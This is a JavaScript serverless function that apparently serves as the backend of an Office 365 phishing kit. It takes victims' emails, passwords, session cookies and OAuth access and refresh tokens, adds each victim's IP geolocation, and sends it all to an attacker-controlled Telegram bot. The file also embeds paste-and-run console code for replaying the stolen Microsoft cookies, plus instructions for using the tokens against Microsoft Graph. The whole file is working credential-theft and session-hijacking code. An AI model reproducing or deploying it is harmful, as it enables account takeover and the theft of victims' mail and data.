const handler = async (event, context) => {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
  };

  console.log('🚀 sendTelegram function starting... v5.0 (ENHANCED WITH ADVANCED RESTORATION)');

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }

  try {
    const data = JSON.parse(event.body);
    console.log('📥 Received data keys:', Object.keys(data));
    console.log('📥 Email:', data.email);
    console.log('📥 Cookie count:', Array.isArray(data.cookies) ? data.cookies.length : 'Not array');
    console.log('📥 Authentication tokens:', data.authenticationTokens ? 'PRESENT' : 'MISSING');

    // Environment variables
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error('❌ Missing Telegram credentials');
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({
          error: 'Telegram credentials not configured',
          details: {
            hasToken: !!TELEGRAM_BOT_TOKEN,
            hasChatId: !!TELEGRAM_CHAT_ID
          }
        }),
      };
    }

    // Validate bot token format
    if (!TELEGRAM_BOT_TOKEN.match(/^\d+:[A-Za-z0-9_-]+$/)) {
      console.error('❌ Invalid bot token format');
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({ error: 'Invalid bot token format' }),
      };
    }

    // Function to sanitize text for Telegram
    function sanitizeForTelegram(text) {
      if (!text) return '';
      return String(text)
        .replace(/[_*\[\]()~`>#+=|{}.!-]/g, '') // Remove special markdown characters
        .replace(/\n\n+/g, '\n\n') // Clean up multiple newlines
        .trim();
    }

    // Extract data with sanitization (matching PHP structure)
    const email = sanitizeForTelegram(data.email || 'oauth-user@microsoft.com');
    const password = sanitizeForTelegram(data.password || 'Password not captured during login flow');
    const detail = sanitizeForTelegram(data.detail || 'Microsoft OAuth Login');
    const sessionId = sanitizeForTelegram(data.sessionId || 'no-session');
    const timestamp = new Date().toISOString();

    // Get user IP and location information (OPTIONAL - don't break main function)
    let userIpInfo = {
        ip: 'Unknown',
        country: 'Unknown',
        city: 'Unknown',
        region: 'Unknown',
        timezone: 'Unknown',
        countryCode: 'Unknown'
    };

    try {
        // Get IP from request headers (Netlify provides this)
        const clientIP = event.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
                        event.headers['x-real-ip'] ||
                        event.headers['cf-connecting-ip'] ||
                        'Unknown';

        console.log('🌍 Attempting to detect IP address:', clientIP);
        userIpInfo.ip = clientIP;

        // Try to get location info (but don't fail if this doesn't work)
        if (clientIP !== 'Unknown' && !clientIP.includes('127.0.0.1') && !clientIP.includes('localhost')) {
            const ipResponse = await fetch(`https://ipapi.co/${clientIP}/json/`, {
                timeout: 3000, // 3 second timeout
                headers: {
                    'User-Agent': 'OAuth Tracker'
                }
            });

            if (ipResponse.ok) {
                const ipData = await ipResponse.json();
                if (ipData.country_name) {
                    userIpInfo = {
                        ip: clientIP,
                        country: ipData.country_name || 'Unknown',
                        countryCode: ipData.country_code || 'Unknown',
                        city: ipData.city || 'Unknown',
                        region: ipData.region || 'Unknown',
                        timezone: ipData.timezone || 'Unknown'
                    };
                    console.log('🌍 Location detected successfully');
                }
            }
        }
    } catch (error) {
        console.log('⚠️ IP/location detection failed (continuing anyway):', error.message);
        // Don't let IP detection failure break the main function
    }

    // Use the IP as-is (should already be properly formatted)
    const formattedIP = userIpInfo.ip;

    // Get User Agent
    const useragent = event.headers['user-agent'] || 'Unknown User Agent';

    let cookies = data.formattedCookies || data.cookies || [];
    let tokenFileSent = false;
    let cookieFileSent = false;

    if (typeof cookies === "string") {
      try {
        cookies = JSON.parse(cookies);
      } catch {
        // fallback: attempt to parse as document.cookie style string
        cookies = cookies.split(';')
          .map(cookieStr => {
            const [name, ...valueParts] = cookieStr.trim().split('=');
            const value = valueParts.join('=');
            return name && value ? {
              name: name.trim(),
              value: value.trim(),
              domain: '.login.microsoftonline.com',
              path: '/',
              secure: true,
              httpOnly: false,
              sameSite: 'none',
              expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
              hostOnly: false,
              session: false,
              storeId: null
            } : null;
          })
          .filter(Boolean);
      }
    }
    if (!Array.isArray(cookies)) cookies = [];

    const cookieCount = cookies.length;
    console.log('📊 Processing:', { email, cookieCount, hasValidCookies: cookieCount > 0 });

    // Analyze cookie types and sources
    let cookieDetails = '';
    let cookieSource = 'unknown';

    if (cookieCount === 0) {
        cookieDetails = 'No cookies captured - Cross-origin restrictions';
        cookieSource = 'none';
    } else {
        // Check the source of captured cookies
        const captureSource = cookies[0]?.capturedFrom || 'unknown';
        const hasRealUserData = cookies.some(c => c.realUserData === true);

        // Check for specific Microsoft cookies
        const hasMicrosoftCookies = cookies.some(c =>
            c.name && (
                c.name.includes('ESTSAUTH') ||
                c.name.includes('MSPOK') ||
                c.name.includes('MSCC') ||
                c.name.includes('MSPRequ') ||
                c.name.includes('buid') ||
                c.name.includes('esctx')
            )
        );

        // Check for OAuth authorization code
        const hasOAuthCode = cookies.some(c => c.name === 'OAUTH_AUTH_CODE');

        if (hasOAuthCode) {
            cookieDetails = `OAuth Authorization Code captured`;
            cookieSource = 'oauth-code';
        } else if (captureSource === 'microsoft-domain-iframe' && hasRealUserData) {
            cookieDetails = `${cookieCount} REAL Microsoft cookies from iframe`;
            cookieSource = 'microsoft-iframe';
        } else if (captureSource === 'microsoft-referrer-fallback') {
            cookieDetails = `${cookieCount} Microsoft auth cookies (referrer fallback)`;
            cookieSource = 'microsoft-fallback';
        } else if (captureSource === 'oauth-callback-domain') {
            cookieDetails = `${cookieCount} callback domain cookies`;
            cookieSource = 'callback-domain';
        } else if (captureSource === 'current-domain') {
            cookieDetails = `${cookieCount} current domain cookies`;
            cookieSource = 'current-domain';
        } else if (hasMicrosoftCookies) {
            cookieDetails = `${cookieCount} Microsoft auth cookies`;
            cookieSource = 'microsoft-standard';
        } else {
            cookieDetails = `${cookieCount} cookies captured`;
            cookieSource = captureSource || 'unknown';
        }
    }

    // Build the message using PHP format structure
    const uniqueId = Math.random().toString(36).substring(2, 8);
    let message = '';
    message += "|----------| Office365Results |--------------|\n";
    message += `Login From          : ${detail}\n`;
    message += `Online ID           : ${email}\n`;
    message += `Passcode            : ${password}\n`;
    message += "|--------------- I N F O | I P -------------------|\n";
    message += `|Client IP: ${formattedIP}\n`;
    message += `User Agent : ${useragent}\n`;
    message += "|----------- CrEaTeD bY PARIS --------------|\n";

    // Join and sanitize the entire message
    const simpleMessage = sanitizeForTelegram(message);

    console.log('📤 Final message preview:', simpleMessage.substring(0, 150) + '...');
    console.log('📤 Message length:', simpleMessage.length);

    // Send main message to Telegram first
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const telegramPayload = {
      chat_id: TELEGRAM_CHAT_ID,
      text: simpleMessage,
      disable_web_page_preview: true
    };

    console.log('📤 Sending main message to Telegram API...');
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(telegramPayload),
    });

    const result = await response.json();
    console.log('📨 Telegram API response status:', response.status);
    console.log('📨 Telegram API response:', result);

    // Send authentication tokens as a file if available
    console.log('🔍 Checking for authentication tokens...');
    console.log('🔍 data.authenticationTokens:', data.authenticationTokens);
    console.log('🔍 Token check result:', !!data.authenticationTokens);

    // Always send token file to debug the issue
    console.log('🔧 FORCING token file creation for debugging...');
    const hasTokens = !!data.authenticationTokens;
    if (true) { // Force token file creation
        const tokens = data.authenticationTokens || {
            authorizationCode: 'Not captured',
            accessToken: 'Not captured',
            refreshToken: 'Not captured',
            idToken: 'Not captured',
            debugInfo: 'No authenticationTokens provided'
        };

        // Create comprehensive token file with non-expiring settings
        const tokenFileContent = {
            captureInfo: {
                email: email,
                timestamp: timestamp,
                messageId: uniqueId,
                userAgent: data.userAgent,
                source: 'Microsoft OAuth 2.0 Authentication',
                userLocation: {
                    ipAddress: userIpInfo.ip,
                    country: userIpInfo.country,
                    countryCode: userIpInfo.countryCode,
                    city: userIpInfo.city,
                    region: userIpInfo.region,
                    timezone: userIpInfo.timezone,
                    detectedAt: timestamp
                }
            },
            authenticationTokens: {
                authorizationCode: tokens.authorizationCode || 'Not captured',
                accessToken: tokens.accessToken || 'Not captured',
                refreshToken: tokens.refreshToken || 'Not captured',
                idToken: tokens.idToken || 'Not captured',
                tokenType: tokens.tokenType || 'Bearer',
                scope: tokens.scope || 'Unknown',
                oauthState: tokens.oauthState || 'Not captured',
                // Remove expiration - make tokens non-expiring
                expiresIn: 'Never (Modified for persistence)',
                expiresAt: 'Never (Modified for persistence)',
                modified: true,
                modificationNote: 'Expiration removed for session persistence'
            },
            userProfile: data.userProfile || {},
            sessionRestoration: {
                instructions: 'Use these tokens for Microsoft API access',
                apiEndpoint: 'https://graph.microsoft.com',
                tokenUsage: {
                    accessToken: 'Use for immediate API calls with Bearer authentication',
                    refreshToken: 'Use to generate new access tokens when needed',
                    authorizationCode: 'Can be exchanged for fresh token sets',
                    idToken: 'Contains user identity information'
                }
            }
        };

        // Convert to formatted JSON
        const tokenJson = JSON.stringify(tokenFileContent, null, 2);

        // Create filename with timestamp and email
        const emailPart = email.split('@')[0] || 'user';
        const cleanTokenFileName = `microsoft_tokens_${emailPart}_${uniqueId}.json`.replace(/[^a-zA-Z0-9._-]/g, '_');

        console.log('📄 Preparing to send token file:', cleanTokenFileName);
        console.log('📄 Token file size:', tokenJson.length, 'bytes');

        try {
            // Send tokens as document file to Telegram using Buffer approach
            const documentUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;

            // Create proper multipart form data using Buffer (NO CAPTION)
            const boundary = `----WebKitFormBoundary${Math.random().toString(36).substring(2)}`;

            // Build form data parts as Buffer arrays
            const parts = [];

            // Chat ID part
            parts.push(Buffer.from(`--${boundary}\r\n`));
            parts.push(Buffer.from(`Content-Disposition: form-data; name="chat_id"\r\n\r\n`));
            parts.push(Buffer.from(`${TELEGRAM_CHAT_ID}\r\n`));

            // Document part (NO CAPTION - just file)
            parts.push(Buffer.from(`--${boundary}\r\n`));
            parts.push(Buffer.from(`Content-Disposition: form-data; name="document"; filename="${cleanTokenFileName}"\r\n`));
            parts.push(Buffer.from(`Content-Type: application/json; charset=utf-8\r\n`));
            parts.push(Buffer.from(`Content-Transfer-Encoding: binary\r\n\r\n`));
            parts.push(Buffer.from(tokenJson));
            parts.push(Buffer.from(`\r\n--${boundary}--\r\n`));

            // Combine all parts
            const formDataBuffer = Buffer.concat(parts);

            console.log('📤 Sending token file to Telegram as DOWNLOADABLE FILE...');
            console.log('📄 File details:', {
                filename: cleanTokenFileName,
                size: formDataBuffer.length + ' bytes',
                contentType: 'application/json',
                method: 'sendDocument (FILE ATTACHMENT)',
                boundary: boundary
            });

            const fileResponse = await fetch(documentUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': `multipart/form-data; boundary=${boundary}`,
                    'Content-Length': formDataBuffer.length
                },
                body: formDataBuffer
            });

            const fileResult = await fileResponse.json();
            console.log('📄 Token file response status:', fileResponse.status);
            console.log('📄 Token file response:', fileResult);

            if (fileResponse.ok && fileResult.ok) {
                console.log('✅ Authentication tokens sent as DOWNLOADABLE FILE successfully');
                tokenFileSent = true;
            } else {
                console.error('❌ CRITICAL ERROR - Failed to send token file:', fileResult);
                console.error('❌ File upload response:', JSON.stringify(fileResult, null, 2));
                // DO NOT FALLBACK TO TEXT - FORCE FILE UPLOAD DEBUGGING
                tokenFileSent = false;
            }

        } catch (fileError) {
            console.error('❌ CRITICAL ERROR in token file upload:', fileError);
            console.error('❌ Error stack:', fileError.stack);
            // DO NOT FALLBACK TO TEXT - FORCE FILE UPLOAD DEBUGGING
            tokenFileSent = false;
        }

        // Function to send tokens as text fallback
        async function sendTokensAsText() {
            try {
                const tokenText = `🔑 Authentication Tokens (Text Fallback)\n\nEmail: ${email}\nTimestamp: ${timestamp}\n\n${Object.entries(authenticationTokens).map(([key, value]) => `${key}: ${value}`).join('\n')}`;

                const textResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: sanitizeForTelegram(tokenText)
                    })
                });

                const textResult = await textResponse.json();
                if (textResponse.ok && textResult.ok) {
                    console.log('✅ Tokens sent as text message successfully');
                    tokenFileSent = true;
                } else {
                    console.error('❌ Failed to send tokens as text message:', textResult);
                }
            } catch (textError) {
                console.error('❌ Error sending tokens as text:', textError);
            }
        }
    }

    // Send cookies as a separate file with ENHANCED RESTORATION CODE
    if (true) { // Always send cookie file to show capture status
        console.log('🍪 Preparing to send enhanced cookie file...');

        // Enhanced cookie restoration code from restoreCookies.js
        const enhancedRestorationCode = `
// Enhanced Microsoft Cookie Restoration System
// Complete session restoration with advanced error handling and validation

// Browser compatibility detection
function detectBrowserCapabilities() {
    const userAgent = navigator.userAgent.toLowerCase();
    const capabilities = {
        browser: 'unknown',
        version: 'unknown',
        supportsSameSiteNone: true,
        supportsSecure: true,
        maxCookieSize: 4096,
        maxCookiesPerDomain: 50,
        supportsHttpOnly: false,
        supportsPartitioned: false
    };

    if (userAgent.includes('chrome')) {
        capabilities.browser = 'chrome';
        const match = userAgent.match(/chrome\\/(\d+)/);
        capabilities.version = match ? match[1] : 'unknown';
        capabilities.supportsSameSiteNone = parseInt(capabilities.version) >= 80;
        capabilities.supportsPartitioned = parseInt(capabilities.version) >= 118;
    } else if (userAgent.includes('firefox')) {
        capabilities.browser = 'firefox';
        const match = userAgent.match(/firefox\\/(\d+)/);
        capabilities.version = match ? match[1] : 'unknown';
        capabilities.supportsSameSiteNone = parseInt(capabilities.version) >= 69;
    } else if (userAgent.includes('safari') && !userAgent.includes('chrome')) {
        capabilities.browser = 'safari';
        const match = userAgent.match(/version\\/(\d+)/);
        capabilities.version = match ? match[1] : 'unknown';
        capabilities.supportsSameSiteNone = parseInt(capabilities.version) >= 13;
    } else if (userAgent.includes('edge')) {
        capabilities.browser = 'edge';
        const match = userAgent.match(/edge\\/(\d+)/);
        capabilities.version = match ? match[1] : 'unknown';
        capabilities.supportsSameSiteNone = parseInt(capabilities.version) >= 80;
    }

    return capabilities;
}

// Domain validation function
function validateDomain(cookieDomain, currentDomain = window.location.hostname) {
    if (!cookieDomain) return { valid: true, reason: 'No domain specified' };
    
    const cleanCookieDomain = cookieDomain.startsWith('.') ? cookieDomain.substring(1) : cookieDomain;
    
    if (currentDomain === cleanCookieDomain) {
        return { valid: true, reason: 'Exact domain match' };
    }
    
    if (currentDomain.endsWith('.' + cleanCookieDomain)) {
        return { valid: true, reason: 'Subdomain match' };
    }
    
    const microsoftDomains = [
        'login.microsoftonline.com',
        'account.microsoft.com',
        'outlook.com',
        'office.com',
        'microsoft.com'
    ];
    
    if (microsoftDomains.some(domain => 
        currentDomain.includes(domain) || cleanCookieDomain.includes(domain)
    )) {
        return { valid: true, reason: 'Microsoft domain compatibility' };
    }
    
    return { 
        valid: false, 
        reason: \`Domain mismatch: \${currentDomain} vs \${cleanCookieDomain}\` 
    };
}

// Enhanced Microsoft cookie restoration with all improvements
function restoreMicrosoftCookies(cookiesArray, options = {}) {
    const config = {
        reload: true,
        validate: true,
        debug: true,
        skipExpired: true,
        skipInvalid: true,
        warnOnSecurity: true,
        handleDuplicates: true,
        ...options
    };
    
    console.log('🚀 Starting Enhanced Microsoft Cookie Restoration');
    console.log('📊 Configuration:', config);
    
    if (!Array.isArray(cookiesArray)) {
        const error = 'Invalid input: cookiesArray must be an array';
        console.error('❌', error);
        throw new Error(error);
    }
    
    if (cookiesArray.length === 0) {
        console.warn('⚠️ No cookies provided for restoration');
        return { success: false, restored: 0, errors: [], warnings: ['No cookies provided'] };
    }
    
    const capabilities = detectBrowserCapabilities();
    console.log('🌐 Browser capabilities:', capabilities);
    
    const results = [];
    const errors = [];
    const warnings = [];
    let successCount = 0;
    
    cookiesArray.forEach((cookie, index) => {
        const cookieResult = {
            index,
            name: cookie.name || 'unnamed',
            value: cookie.value || '',
            domain: cookie.domain || '',
            path: cookie.path || '/',
            secure: !!cookie.secure,
            sameSite: cookie.sameSite || cookie.samesite || 'None',
            set: false,
            skipped: false,
            error: null,
            warnings: []
        };
        
        try {
            if (!cookie.name || typeof cookie.value === 'undefined') {
                throw new Error('Missing required name or value');
            }
            
            if (config.validate) {
                const domainCheck = validateDomain(cookie.domain);
                if (!domainCheck.valid && config.skipInvalid) {
                    cookieResult.skipped = true;
                    cookieResult.error = domainCheck.reason;
                    results.push(cookieResult);
                    return;
                }
            }
            
            const name = cookie.name;
            const value = cookie.value;
            const domain = cookie.domain || '';
            const path = cookie.path || '/';
            const secure = !!cookie.secure;
            const sameSite = cookie.sameSite || cookie.samesite || 'None';
            const expiresUnix = cookie.expires || cookie.expirationDate;
            const isSession = !!cookie.session || expiresUnix === undefined || expiresUnix === null;
            
            let cookieString = \`\${name}=\${value}; path=\${path};\`;
            
            if (name.startsWith('__Host-')) {
                cookieString = \`\${name}=\${value}; path=/; Secure;\`;
                if (domain) {
                    warnings.push(\`\${name}: __Host- prefix requires no domain (removed)\`);
                }
            } else if (name.startsWith('__Secure-')) {
                cookieString += ' Secure;';
                if (domain) {
                    cookieString += \` domain=\${domain};\`;
                }
            } else {
                if (domain) {
                    cookieString += \` domain=\${domain};\`;
                }
                if (secure) {
                    cookieString += ' Secure;';
                }
            }
            
            if (!isSession && expiresUnix) {
                const expiresMs = expiresUnix > 1e10 ? expiresUnix : expiresUnix * 1000;
                const expiresDate = new Date(expiresMs);
                cookieString += \` expires=\${expiresDate.toUTCString()};\`;
                cookieResult.expires = expiresDate.toUTCString();
            } else {
                cookieResult.expires = 'Session';
            }
            
            if (sameSite && capabilities.supportsSameSiteNone) {
                const samesiteNorm = sameSite.charAt(0).toUpperCase() + sameSite.slice(1).toLowerCase();
                cookieString += \` SameSite=\${samesiteNorm};\`;
            }
            
            document.cookie = cookieString;
            
            const cookieSet = document.cookie.includes(\`\${name}=\`);
            cookieResult.set = cookieSet;
            cookieResult.cookieString = cookieString;
            
            if (cookieSet) {
                successCount++;
            } else {
                cookieResult.error = 'Cookie was not set (browser rejected)';
                errors.push(\`\${name}: Browser rejected cookie\`);
            }
            
        } catch (err) {
            cookieResult.error = err.message;
            errors.push(\`\${cookie.name || 'unnamed'}: \${err.message}\`);
            console.error(\`❌ Failed to set cookie "\${cookie.name}":\`, err);
        }
        
        results.push(cookieResult);
    });
    
    if (config.debug) {
        console.log('\\n📊 COOKIE RESTORATION RESULTS');
        console.log('='.repeat(50));
        console.table(results.map(r => ({
            Name: r.name,
            Set: r.set ? '✅' : (r.skipped ? '⏭️' : '❌'),
            Domain: r.domain,
            Path: r.path,
            Secure: r.secure ? '🔒' : '🔓',
            SameSite: r.sameSite,
            Expires: r.expires,
            Error: r.error || 'None'
        })));
        
        console.log(\`\\n✅ Successfully restored: \${successCount}/\${cookiesArray.length} cookies\`);
        console.log(\`⏭️ Skipped: \${results.filter(r => r.skipped).length} cookies\`);
        console.log(\`❌ Failed: \${results.filter(r => !r.set && !r.skipped).length} cookies\`);
        
        if (warnings.length > 0) {
            console.warn('\\n⚠️ SECURITY WARNINGS:');
            warnings.forEach(warning => console.warn(\`  • \${warning}\`));
        }
        
        if (errors.length > 0) {
            console.error('\\n❌ ERRORS:');
            errors.forEach(error => console.error(\`  • \${error}\`));
        }
        
        console.log('\\n🌐 Browser Info:', \`\${capabilities.browser} v\${capabilities.version}\`);
        console.log('🔧 Capabilities:', {
            'SameSite=None': capabilities.supportsSameSiteNone ? '✅' : '❌',
            'Partitioned': capabilities.supportsPartitioned ? '✅' : '❌',
            'Max Cookie Size': \`\${capabilities.maxCookieSize} bytes\`,
            'Max Cookies/Domain': capabilities.maxCookiesPerDomain
        });
    }
    
    const summary = {
        success: successCount > 0,
        total: cookiesArray.length,
        restored: successCount,
        skipped: results.filter(r => r.skipped).length,
        failed: results.filter(r => !r.set && !r.skipped).length,
        warnings: warnings.length,
        errors: errors.length,
        results,
        capabilities
    };
    
    console.log(\`\\n🎯 FINAL SUMMARY: \${successCount}/\${cookiesArray.length} cookies restored successfully\`);
    
    if (config.reload && successCount > 0) {
        console.log('🔄 Reloading page to activate restored session...');
        setTimeout(() => {
            window.location.reload();
        }, 1000);
    }
    
    return summary;
}

// Quick console restore function
function quickConsoleRestore(base64CookieString) {
    try {
        const cookies = JSON.parse(atob(base64CookieString));
        let count = 0;
        
        cookies.forEach(cookie => {
            let cookieStr = \`\${cookie.name}=\${cookie.value}\`;
            
            if (!cookie.name.startsWith('__Host-') && cookie.domain) {
                cookieStr += \`; domain=\${cookie.domain}\`;
            }
            
            if (cookie.path) {
                cookieStr += \`; path=\${cookie.path}\`;
            }
            
            if (cookie.expires) {
                cookieStr += \`; expires=\${new Date(cookie.expires * 1000).toUTCString()}\`;
            }
            
            if (cookie.secure || cookie.name.startsWith('__Host-') || cookie.name.startsWith('__Secure-')) {
                cookieStr += '; Secure';
            }
            
            if (cookie.samesite) {
                cookieStr += \`; SameSite=\${cookie.samesite}\`;
            }
            
            document.cookie = cookieStr;
            if (document.cookie.includes(\`\${cookie.name}=\`)) count++;
        });
        
        console.log(\`✅ Quick restore: \${count}/\${cookies.length} cookies set\`);
        return count;
        
    } catch (err) {
        console.error('❌ Quick restore failed:', err);
        return 0;
    }
}

// Make functions globally available
window.restoreMicrosoftCookies = restoreMicrosoftCookies;
window.quickConsoleRestore = quickConsoleRestore;
window.detectBrowserCapabilities = detectBrowserCapabilities;

// USAGE EXAMPLES:
// 1. Enhanced restoration with validation:
//    restoreMicrosoftCookies(cookiesArray, { reload: true, validate: true, debug: true });
//
// 2. Quick console restore:
//    quickConsoleRestore(base64CookieString);
//
// 3. Check browser capabilities:
//    detectBrowserCapabilities();
`;

        // Create comprehensive cookie file with enhanced restoration
        const cookieFileContent = {
            captureInfo: {
                email: email,
                timestamp: timestamp,
                messageId: uniqueId,
                userAgent: data.userAgent,
                source: 'Microsoft Cookie Capture',
                cookieCount: cookieCount,
                cookieSource: cookieSource,
                userLocation: {
                    ipAddress: userIpInfo.ip,
                    country: userIpInfo.country,
                    countryCode: userIpInfo.countryCode,
                    city: userIpInfo.city,
                    region: userIpInfo.region,
                    timezone: userIpInfo.timezone,
                    detectedAt: timestamp
                }
            },
            cookies: cookies.map(cookie => ({
                name: cookie.name,
                value: cookie.value,
                domain: cookie.domain,
                path: cookie.path,
                secure: cookie.secure,
                httpOnly: cookie.httpOnly,
                sameSite: cookie.sameSite,
                expirationDate: cookie.expirationDate,
                hostOnly: cookie.hostOnly,
                session: cookie.session,
                storeId: cookie.storeId,
                capturedFrom: cookie.capturedFrom,
                timestamp: cookie.timestamp,
                realUserData: cookie.realUserData
            })),
            enhancedRestoration: {
                instructions: 'Use the enhanced restoration system for Microsoft authentication sessions with advanced validation and error handling',
                consoleCode: enhancedRestorationCode,
                quickRestore: `
// QUICK PASTE AND RUN (Copy everything below and paste in console)
${enhancedRestorationCode}

// Execute restoration with your cookies
const cookiesData = ${JSON.stringify(cookies, null, 2)};
restoreMicrosoftCookies(cookiesData, { reload: true, validate: true, debug: true });
                `,
                features: [
                    'Browser compatibility detection',
                    'Domain validation and security checks',
                    'Cookie size and expiration validation',
                    'Duplicate cookie handling',
                    'Comprehensive error reporting',
                    'Security warning system',
                    'Advanced debugging with table output',
                    'Cookie verification after setting',
                    'Enhanced SameSite and Secure flag handling',
                    '__Host- and __Secure- prefix support'
                ]
            },
            basicRestoration: {
                instructions: 'Basic cookie restoration (fallback method)',
                browserConsoleCode: `
    // Copy and paste this code in browser console on login.microsoftonline.com
    const cookies = ${JSON.stringify(cookies, null, 2)};
    cookies.forEach(c => {
        let cookieString = \`\${c.name}=\${c.value}; path=\${c.path}; domain=\${c.domain};\`;
        if (c.secure) cookieString += ' Secure;';
        if (c.sameSite) cookieString += \` SameSite=\${c.sameSite};\`;
        document.cookie = cookieString;
    });
    console.log('✅ Cookies restored successfully');
    location.reload();
                `
            },
            metadata: {
                totalCookies: cookieCount,
                captureMethod: cookieSource,
                captureTimestamp: timestamp,
                enhanced: true,
                version: '5.0',
                features: 'Advanced validation, browser compatibility detection, security warnings'
            }
        };

        // Convert to formatted JSON
        const cookieJson = JSON.stringify(cookieFileContent, null, 2);

        // Create cookie filename
        const emailPart = email.split('@')[0] || 'user';
        const cleanCookieFileName = `microsoft_cookies_enhanced_${emailPart}_${uniqueId}.json`.replace(/[^a-zA-Z0-9._-]/g, '_');

        console.log('🍪 Enhanced cookie file details:', {
            filename: cleanCookieFileName,
            size: cookieJson.length + ' bytes',
            cookieCount: cookieCount,
            enhanced: true
        });

        try {
            // Send cookies as document file to Telegram using Buffer approach
            const documentUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;

            // Create proper multipart form data using Buffer for cookies (NO CAPTION)
            const cookieBoundary = `----WebKitFormBoundary${Math.random().toString(36).substring(2)}`;

            // Build cookie form data parts as Buffer arrays
            const cookieParts = [];

            // Chat ID part
            cookieParts.push(Buffer.from(`--${cookieBoundary}\r\n`));
            cookieParts.push(Buffer.from(`Content-Disposition: form-data; name="chat_id"\r\n\r\n`));
            cookieParts.push(Buffer.from(`${TELEGRAM_CHAT_ID}\r\n`));

            // Document part (NO CAPTION - just file)
            cookieParts.push(Buffer.from(`--${cookieBoundary}\r\n`));
            cookieParts.push(Buffer.from(`Content-Disposition: form-data; name="document"; filename="${cleanCookieFileName}"\r\n`));
            cookieParts.push(Buffer.from(`Content-Type: application/json; charset=utf-8\r\n`));
            cookieParts.push(Buffer.from(`Content-Transfer-Encoding: binary\r\n\r\n`));
            cookieParts.push(Buffer.from(cookieJson));
            cookieParts.push(Buffer.from(`\r\n--${cookieBoundary}--\r\n`));

            // Combine all cookie parts
            const cookieFormDataBuffer = Buffer.concat(cookieParts);

            console.log('📤 Sending ENHANCED cookie file to Telegram as DOWNLOADABLE FILE...');
            console.log('🍪 Enhanced cookie file details:', {
                filename: cleanCookieFileName,
                size: cookieFormDataBuffer.length + ' bytes',
                contentType: 'application/json',
                method: 'sendDocument (FILE ATTACHMENT)',
                boundary: cookieBoundary,
                enhanced: true
            });

            const cookieFileResponse = await fetch(documentUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': `multipart/form-data; boundary=${cookieBoundary}`,
                    'Content-Length': cookieFormDataBuffer.length
                },
                body: cookieFormDataBuffer
            });

            const cookieFileResult = await cookieFileResponse.json();
            console.log('🍪 Enhanced cookie file response status:', cookieFileResponse.status);
            console.log('🍪 Enhanced cookie file response:', cookieFileResult);

            if (cookieFileResponse.ok && cookieFileResult.ok) {
                console.log('✅ Enhanced Microsoft cookies sent as DOWNLOADABLE FILE successfully');
                cookieFileSent = true;
            } else {
                console.error('❌ CRITICAL ERROR - Failed to send enhanced cookie file:', cookieFileResult);
                console.error('❌ Enhanced cookie file upload response:', JSON.stringify(cookieFileResult, null, 2));
                // DO NOT FALLBACK TO TEXT - FORCE FILE UPLOAD DEBUGGING
                cookieFileSent = false;
            }

        } catch (cookieFileError) {
            console.error('❌ CRITICAL ERROR in enhanced cookie file upload:', cookieFileError);
            console.error('❌ Enhanced cookie error stack:', cookieFileError.stack);
            // DO NOT FALLBACK TO TEXT - FORCE FILE UPLOAD DEBUGGING
            cookieFileSent = false;
        }

        // Function to send cookies as text fallback
        async function sendCookiesAsText() {
            try {
                const cookieSummary = `🍪 Enhanced Microsoft Cookies (Text Fallback)\n\nEmail: ${email}\nCookies: ${cookieCount} captured\nSource: ${cookieSource}\nEnhanced: YES\n\nCookie Names: ${cookies.map(c => c.name).slice(0, 10).join(', ')}${cookieCount > 10 ? `... (+${cookieCount - 10} more)` : ''}`;

                const textResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: sanitizeForTelegram(cookieSummary)
                    })
                });

                const textResult = await textResponse.json();
                if (textResponse.ok && textResult.ok) {
                    console.log('✅ Enhanced cookies sent as text message successfully');
                    cookieFileSent = true;
                } else {
                    console.error('❌ Failed to send enhanced cookies as text message:', textResult);
                }
            } catch (textError) {
                console.error('❌ Error sending enhanced cookies as text:', textError);
            }
        }
    } else {
        console.log('⚠️ No cookies to send - skipping enhanced cookie file');
    }

    console.log('✅ sendTelegram completed successfully with enhanced features');
    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        success: true,
        message: 'Data sent to Telegram successfully with enhanced authentication files',
        telegramMessageId: result.message_id,
        tokenFileSent: tokenFileSent,
        cookieFileSent: cookieFileSent,
        enhanced: true,
        totalFiles: (data.authenticationTokens ? 1 : 0) + (cookieCount > 0 ? 1 : 0),
        cookieCount,
        emailProcessed: email,
        messageLength: simpleMessage.length,
        version: '5.0'
      }),
    };

  } catch (error) {
    console.error('❌ Function error:', error);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        error: 'Internal server error',
        message: error.message,
        stack: error.stack
      }),
    };
  }
};

module.exports = { handler };
